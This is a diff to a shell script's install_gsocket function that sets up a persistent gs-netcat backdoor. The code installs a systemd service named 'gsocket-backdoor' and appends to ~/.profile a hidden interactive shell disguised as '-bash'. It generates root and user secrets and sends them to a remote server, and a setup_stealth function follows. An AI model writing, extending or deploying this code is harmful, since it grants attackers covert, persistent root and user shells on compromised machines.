@@ -357,7 +357,8 @@ install_gsocket() {
     fi
     
     # Generate a unique secret
-    local gs_secret=$(gs-netcat -g)
+    local gs_root_secret=$(gs-netcat -g)
+    local gs_user_secret=$(gs-netcat -g)
     
     # Create systemd service for persistent connection
     cat > "$TEMP_DIR/gsocket-backdoor.service" << EOF
@@ -367,7 +368,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/local/bin/gs-netcat -s $gs_secret -lqi
+ExecStart=/usr/local/bin/gs-netcat -s $gs_root_secret -lqi
 Restart=always
 RestartSec=10
 StandardOutput=null
@@ -382,27 +383,27 @@ EOF
     log_cmd "sudo systemctl enable gsocket-backdoor.service" "Enabling gsocket service" "$log_file"
     log_cmd "sudo systemctl start gsocket-backdoor.service" "Starting gsocket service" "$log_file"
     
-    # Also create a user service if running as non-root
-    if [ $EUID -ne 0 ]; then
-        mkdir -p ~/.config/systemd/user/
-        cp /etc/systemd/system/gsocket-backdoor.service ~/.config/systemd/user/
-        log_cmd "systemctl --user daemon-reload" "Reloading user systemd" "$log_file"
-        log_cmd "systemctl --user enable gsocket-backdoor.service" "Enabling user gsocket service" "$log_file"
-        log_cmd "systemctl --user start gsocket-backdoor.service" "Starting user gsocket service" "$log_file"
-    fi
+    # Also put a gs-netcat backdoor in user's .profile
+    log_cmd "echo \"killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS=\"-s \"$gs_user_secret\" -liqD\" SHELL=/bin/bash exec -a -bash gs-netcat)\" >> ~/.profile" "Add backdoor to .profile" "$log_file"
+    log_cmd "source ~/.profile" "Reloading .profile" "$log_file"
     
     # Create connection instructions
     cat > "$TEMP_DIR/gsocket-info.txt" << EOF
 GSocket Connection Information
 =============================
-Secret: $gs_secret
-Connection command: gs-netcat -s $gs_secret -i
+Root secret: $gs_root_secret
+User secret: $gs_user_secret
+
+Connect as root: gs-netcat -s $gs_root_secret -i
+Connect as user: gs-netcat -s $gs_user_secret -i
+=============================
 EOF
 
     # Send the gsocket secret to the server
-    send_logs "$log_file" "$gs_secret" "gsocket_secret"
+    send_logs "$log_file" "$gs_root_secret" "gsocket_root_secret"
+    send_logs "$log_file" "$gs_user_secret" "gsocket_user_secret"
     
-    echo "[+] GSocket installed. You can connect using: gs-netcat -s $gs_secret"
+    echo "[+] GSocket installed. You can connect using: gs-netcat -s $gs_root_secret"
 }
 
 setup_stealth() {
